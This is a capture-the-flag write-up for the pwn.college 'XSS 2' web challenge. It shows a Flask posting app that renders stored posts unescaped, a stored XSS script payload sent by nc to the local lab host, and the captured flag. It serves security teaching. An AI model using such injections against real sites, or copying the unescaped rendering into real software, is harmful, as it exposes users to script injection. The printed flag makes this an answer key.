---
layout: page
title: "XSS 2 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

We’re given a Flask application that simulates a minimal anonymous posting service. The server receives content from the user, stores it in a temporary SQLite database, and displays it on the homepage. There's no output sanitization, making it vulnerable to stored XSS.

---

## 🔍 Source Code Analysis

### Flask Server

```python
#!/opt/pwn.college/python

import flask
import os
import sqlite3
import tempfile

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

# Create a basic table with a default post
db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")

@app.route("/", methods=["POST"])
def challenge_post():
    content = flask.request.form.get("content", "")
    db.execute("INSERT INTO posts VALUES (?)", [content])
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"
    for post in db.execute("SELECT content FROM posts").fetchall():
        page += "<hr>" + post["content"] + "\n"
    return page + "</body></html>"

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

### Key Observations
- User input is directly inserted into the database.
- The content is displayed on the page without escaping, meaning any HTML or JavaScript gets rendered.
- This leads to a stored XSS vulnerability.

---

## Exploit
We inject the following payload using a manual HTTP request:
```bash
printf 'POST / HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:39\r\n\r\ncontent=<script>alert("PWNED")</script>' | nc challenge.localhost 80
```
### Server Response
```
HTTP/1.1 302 FOUND
Location: /
...
```
This tells us our payload has been stored. To verify, we fetch the page again:
```
curl http://challenge.localhost/
```

Output:
```bash
<html><body>
Welcome to pwnpost, the anonymous posting service. Post away!
<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
<hr>First Post!
<hr><script>alert("PWNED")</script>
</body></html>
```
This confirms the XSS injection.

---

## Flag Capture
The victim browser (simulated by /challenge/victim) visits the site:
```bash
/challenge/victim
```
Output:
```bash
Visiting http://challenge.localhost:80/
Alert triggered! Your reward:
pwn.college{E40Av2Qs1qKI0QJwDkwS3i1jUBT.QX3cTN2wSM0IzMyEzW}
```

---

## Flag
``` 
pwn.college{E40Av2Qs1qKI0QJwDkwS3i1jUBT.QX3cTN2wSM0IzMyEzW}
```
---
